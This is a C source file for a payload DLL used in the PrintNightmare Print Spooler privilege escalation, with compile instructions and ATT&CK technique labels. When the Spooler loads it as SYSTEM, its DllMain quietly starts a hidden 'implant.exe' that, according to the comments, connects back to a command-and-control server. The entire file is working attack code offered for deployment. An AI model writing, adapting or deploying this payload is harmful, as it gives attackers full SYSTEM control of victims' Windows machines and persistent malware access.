/*
 * elevate.c — Payload DLL for PrintNightmare LPE
 *
 * Loaded by the Print Spooler as SYSTEM.
 * Re-launches the implant with SYSTEM privileges.
 *
 * Compilation :
 *   x86_64-w64-mingw32-gcc -shared -o elevate.dll elevate.c -s
 *
 * MITRE ATT&CK :
 *   T1068  — Exploitation for Privilege Escalation
 *   T1059.003 — Windows Command Shell
 */

#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    (void)hinstDLL;
    (void)lpReserved;

    if (fdwReason != DLL_PROCESS_ATTACH)
        return TRUE;

    /*
     * The Spooler loads this DLL as SYSTEM.
     * Spawn a new implant instance that will connect back
     * to the C2 with SYSTEM privileges.
     *
     * Adjust IMPLANT_PATH to match your deployment location.
     */
#ifndef IMPLANT_PATH
#define IMPLANT_PATH "C:\\Windows\\Temp\\implant.exe"
#endif

    STARTUPINFOA si        = {0};
    si.cb                  = sizeof(si);
    si.dwFlags             = STARTF_USESHOWWINDOW;
    si.wShowWindow         = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    CreateProcessA(NULL, IMPLANT_PATH, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    if (pi.hProcess)
        CloseHandle(pi.hProcess);
    if (pi.hThread)
        CloseHandle(pi.hThread);

    return TRUE;
}
